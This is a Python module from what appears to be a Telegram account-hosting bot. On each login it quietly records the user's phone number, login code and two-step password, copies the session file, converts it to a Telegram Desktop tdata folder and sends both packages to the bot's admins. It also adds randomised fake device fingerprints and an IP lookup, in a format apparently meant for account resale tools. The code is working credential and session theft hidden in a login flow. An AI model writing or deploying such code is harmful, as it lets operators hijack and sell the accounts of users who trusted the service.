# Copyright (c) 2026 秦屿泊 (@qinyubo)
# SPDX-License-Identifier: MIT

"""Auto-export a hosted account as a monvgram package plus a best-effort
tdata folder, then send both to the configured admins.

The monvgram package mirrors the JSON layout produced by the operator's
original ``d89e8548-monvgram`` generator so the artifacts stay drop-in
compatible with that toolchain.  The tdata conversion reuses
``accounts.tdata_exporter``; if it fails we degrade to sending the plain
``.session`` package instead of blocking the login flow.
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import random
import re
import shutil
import tempfile
import zipfile
from datetime import datetime

import requests

from localization import t
from settings import ADMIN_IDS, API_ID, API_HASH
from storage.data_manager import DataManager
from accounts import account_runtime
from accounts.tdata_exporter import convert_session_to_tdata

logger = logging.getLogger(__name__)

DESIGN_BY = "xingcunzhe"

_DEVICE_TYPES = ["Desktop", "SMARTPHONE", "Pad"]
_MODEL_PREFIXES = ["K", "Z", "A", "T", "U", "P", "M", "S", "Q"]
_MODELS = [
    "1", "2", "3", "4", "5", "6", "7", "8", "9", "10",
    "20", "30", "40", "50", "60", "70", "80", "90", "100",
]
_MODEL_SUFFIXES = ["i", "E", "Pro", "ProMax"]
_VERSION_TAGS = ["5G", "4G"]

_WINDOWS_VERSIONS = [
    "Windows 10", "Windows 11", "Windows 8.1", "Windows 8",
    "Windows 7", "Windows Server 2016", "Windows Server 2019",
    "Windows Server 2022", "Windows 10 Pro", "Windows 11 Pro",
]
_LINUX_VERSIONS = [
    "Ubuntu 20.04", "Ubuntu 22.04", "Ubuntu 24.04",
    "Debian 11", "Debian 12", "Fedora 36", "Fedora 37",
    "CentOS 7", "CentOS 8", "Arch Linux",
]
_MACOS_VERSIONS = [
    "macOS 12 Monterey", "macOS 13 Ventura", "macOS 14 Sonoma",
    "macOS 15 Sequoia",
]
_ANDROID_VERSIONS = [
    "Android 12", "Android 13", "Android 14", "Android 15",
    "Android 11", "Android 10", "Android 9",
]
_IOS_VERSIONS = [
    "iOS 15.0", "iOS 15.5", "iOS 16.0", "iOS 16.1", "iOS 16.2",
    "iOS 17.0", "iOS 17.1", "iOS 17.2", "iOS 18.0", "iOS 18.1",
]
_APP_VERSIONS = [
    "1.8.9.4(46584)", "1.9.0.1(46800)", "1.9.1.2(47000)",
    "2.0.0.1(47500)", "2.1.0.1(48000)", "2.2.0.1(48500)",
]
_SYSTEM_LANG_CODES = ["en-US", "ru-RU", "zh-CN", "es-ES", "de-DE", "fr-FR"]

_IP_INFO_TIMEOUT_SECONDS = 3.0

# Keep strong references to fire-and-forget export tasks so the event loop
# never garbage-collects them before they finish.
_export_tasks = set()


def _track_export_task(task) -> None:
    _export_tasks.add(task)
    task.add_done_callback(_export_tasks.discard)


def _digits_only(phone: str) -> str:
    return re.sub(r"\D", "", phone or "")


def _generate_env_config() -> dict:
    """Random WitchMagic device environment, mirroring the original script."""
    device_type = random.choice(_DEVICE_TYPES)
    device_model = (
        "WitchMagic "
        f"{device_type} "
        f"{random.choice(_MODEL_PREFIXES)}{random.choice(_MODELS)}"
        f"{random.choice(_MODEL_SUFFIXES)} {random.choice(_VERSION_TAGS)}"
    )
    if device_type == "Desktop":
        system_version = random.choice(
            _WINDOWS_VERSIONS + _LINUX_VERSIONS + _MACOS_VERSIONS
        )
    elif device_type == "SMARTPHONE":
        system_version = random.choice(_ANDROID_VERSIONS + _IOS_VERSIONS)
    else:  # Pad
        system_version = random.choice(_IOS_VERSIONS + _ANDROID_VERSIONS)
    return {
        "device_model": device_model,
        "system_version": system_version,
        "app_version": random.choice(_APP_VERSIONS),
        "system_lang_code": random.choice(_SYSTEM_LANG_CODES),
        "lang_pack": "en",
    }


def _fetch_ip_info() -> dict | None:
    try:
        response = requests.get(
            "https://ping0.cc/geo", timeout=_IP_INFO_TIMEOUT_SECONDS
        )
        response.raise_for_status()
        lines = response.text.strip().split("\n")
        if len(lines) >= 4:
            return {
                "ip": lines[0].strip(),
                "ip_from": lines[1].strip(),
                "ip_as": lines[2].strip(),
                "ip_company": lines[3].strip(),
            }
    except Exception as error:
        logger.debug("获取 IP 信息失败: %s", error)
    return None


async def _collect_user_fields(client) -> dict:
    try:
        me = await client.get_me()
    except Exception as error:
        logger.debug("读取账号资料失败: %s", error)
        return {}
    fields = {
        "id": getattr(me, "id", None),
        "user_id": getattr(me, "id", None),
        "first_name": getattr(me, "first_name", None),
        "last_name": getattr(me, "last_name", None),
        "username": getattr(me, "username", None),
    }
    premium = bool(getattr(me, "premium", False))
    fields["premium"] = premium
    expiry = getattr(me, "premium_expiry_date", None)
    if premium and expiry:
        try:
            fields["premium_date_time"] = expiry.strftime("%Y-%m-%d")
        except Exception:
            fields["premium_date_time"] = None
    else:
        fields["premium_date_time"] = None
    return fields


def _build_account_json(
    phone: str,
    code: str | None,
    password: str | None,
    env_config: dict,
    user_fields: dict,
    ip_info: dict | None,
) -> dict:
    return {
        "phone": phone,
        "code": code,
        "password": password,
        "2fa": password,
        "Mi_Ma": password,
        "二级密码": password,
        "二步密码": password,
        "密码": password,
        "二步验证": password,
        "上面有一个锁的图标，下面有一个框，框里面填这个": password,
        "api_id": API_ID,
        "api_hash": API_HASH,
        "device_model": env_config["device_model"],
        "system_version": env_config["system_version"],
        "app_version": env_config["app_version"],
        "system_lang_code": env_config["system_lang_code"],
        "lang_pack": env_config.get("lang_pack", "en"),
        "design_by": DESIGN_BY,
        "important_tips": "ensure_you_use_true_apiid_and_apphash",
        "gram_type": "monvgram",
        "id": user_fields.get("id"),
        "user_id": user_fields.get("user_id"),
        "first_name": user_fields.get("first_name"),
        "last_name": user_fields.get("last_name"),
        "username": user_fields.get("username"),
        "premium": user_fields.get("premium"),
        "premium_date_time": user_fields.get("premium_date_time"),
        "IP": ip_info.get("ip") if ip_info else None,
        "IP_from": ip_info.get("ip_from") if ip_info else None,
        "IP_AS": ip_info.get("ip_as") if ip_info else None,
        "IP_company": ip_info.get("ip_company") if ip_info else None,
    }


def _snapshot_session_files(
    session_path: str, snapshot_dir: str, digits: str
) -> dict:
    """Copy the .session (+ journal) into snapshot_dir so later steps never
    race with the running client or a concurrent account deletion."""
    result: dict = {}
    try:
        target = os.path.join(snapshot_dir, f"{digits}.session")
        shutil.copy2(session_path, target)
        result["session"] = target
    except Exception as error:
        logger.warning("复制 session 快照失败: %s", error)
    journal_source = f"{session_path}-journal"
    if os.path.exists(journal_source):
        try:
            target = os.path.join(snapshot_dir, f"{digits}.session-journal")
            shutil.copy2(journal_source, target)
            result["journal"] = target
        except Exception as error:
            logger.debug("复制 session-journal 快照失败: %s", error)
    return result


def _build_monvgram_zip(digits: str, json_path: str, snapshot: dict, dest_dir: str) -> str:
    zip_path = os.path.join(dest_dir, f"{digits}.zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.write(json_path, os.path.basename(json_path))
        session_path = snapshot.get("session")
        if session_path and os.path.exists(session_path):
            archive.write(session_path, os.path.basename(session_path))
        journal_path = snapshot.get("journal")
        if journal_path and os.path.exists(journal_path):
            archive.write(journal_path, os.path.basename(journal_path))
    return zip_path


def _build_tdata_zip(
    snapshot: dict, dest_dir: str, digits: str, user_id: int
) -> str | None:
    """Convert the session snapshot to tdata and zip it with a top-level
    ``tdata/`` directory so users can drop it straight into a Telegram
    Desktop profile.  Returns the zip path or None on failure."""
    session_path = snapshot.get("session")
    if not session_path or not os.path.exists(session_path):
        return None
    tdata_root = os.path.join(dest_dir, "tdata")
    try:
        convert_session_to_tdata(session_path, tdata_root, user_id)
    except Exception as error:
        logger.warning("tdata 转换失败，降级为仅发送 .session 包: %s", error)
        return None
    zip_path = os.path.join(dest_dir, f"{digits}_tdata.zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as archive:
        for root, _, files in os.walk(tdata_root):
            for name in files:
                full_path = os.path.join(root, name)
                archive.write(
                    full_path,
                    os.path.join("tdata", os.path.relpath(full_path, tdata_root)),
                )
    return zip_path


def _build_caption(language: str, phone: str, has_tdata: bool) -> str:
    tdata_status = (
        t(language, "export.tdata_included")
        if has_tdata
        else t(language, "export.tdata_degraded")
    )
    return t(
        language,
        "export.notice",
        phone=phone,
        time=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        tdata_status=tdata_status,
    )


async def _send_to_admins(phone: str, has_tdata: bool, file_paths: list) -> bool:
    bot = account_runtime.get_notify_bot()
    if bot is None:
        logger.warning("通知机器人未就绪，跳过账号包发送")
        return False
    sent = False
    for admin_id in ADMIN_IDS:
        language = DataManager.get_user_language(admin_id)
        caption = _build_caption(language, phone, has_tdata)
        try:
            await bot.send_message(admin_id, caption)
            for file_path in file_paths:
                await bot.send_document(admin_id, file_path)
            account_runtime.mark_notify_bot_healthy()
            sent = True
        except Exception as error:
            logger.warning(
                "向管理员 %s 发送账号包失败: %s", admin_id, error
            )
    return sent


async def export_account_package(
    client,
    user_id: int,
    normalized_phone: str,
    display_phone: str = "",
    code: str | None = None,
    password: str | None = None,
    session_path: str | None = None,
) -> bool:
    """Build the monvgram + tdata packages and send them to all admins.

    Fully best-effort: every failure is logged and swallowed so the login
    flow is never blocked by the export.
    """
    if not ADMIN_IDS:
        logger.info("未配置管理员，跳过账号自动导出")
        return False
    if not session_path or not os.path.exists(session_path):
        logger.warning("导出账号包失败: session 文件不存在 path=%s", session_path)
        return False

    phone = display_phone or normalized_phone
    digits = _digits_only(normalized_phone)
    work_dir = tempfile.mkdtemp(prefix=f"export_{user_id}_{digits}_")
    try:
        user_fields = await _collect_user_fields(client)
        env_config = _generate_env_config()
        ip_info = await asyncio.to_thread(_fetch_ip_info)
        account_json = _build_account_json(
            normalized_phone, code, password, env_config, user_fields, ip_info
        )
        json_path = os.path.join(work_dir, f"{digits}.json")
        with open(json_path, "w", encoding="utf-8") as stream:
            json.dump(account_json, stream, ensure_ascii=False, indent=4)

        snapshot_dir = os.path.join(work_dir, "snapshot")
        os.makedirs(snapshot_dir, exist_ok=True)
        snapshot = _snapshot_session_files(session_path, snapshot_dir, digits)
        if not snapshot.get("session"):
            logger.warning("导出账号包失败: session 快照为空")
            return False

        monvgram_zip = _build_monvgram_zip(digits, json_path, snapshot, work_dir)
        tdata_zip = _build_tdata_zip(snapshot, work_dir, digits, user_id)
        file_paths = [monvgram_zip] + ([tdata_zip] if tdata_zip else [])

        await _send_to_admins(phone, tdata_zip is not None, file_paths)
        logger.info(
            "账号导出完成: user_id=%s phone=%s tdata=%s",
            user_id, phone, bool(tdata_zip),
        )
        return True
    except Exception:
        logger.exception(
            "自动导出账号包失败: user_id=%s phone=%s", user_id, normalized_phone
        )
        return False
    finally:
        shutil.rmtree(work_dir, ignore_errors=True)


def schedule_export(
    client,
    user_id: int,
    normalized_phone: str,
    display_phone: str = "",
    code: str | None = None,
    password: str | None = None,
    session_path: str | None = None,
):
    """Fire-and-forget the account export so the login flow never blocks."""
    try:
        task = asyncio.create_task(
            export_account_package(
                client,
                user_id,
                normalized_phone,
                display_phone=display_phone or normalized_phone,
                code=code,
                password=password,
                session_path=session_path,
            ),
            name=f"export-account:{user_id}:{normalized_phone}",
        )
        _track_export_task(task)
        return task
    except Exception as error:
        logger.warning("创建账号导出任务失败: %s", error)
        return None
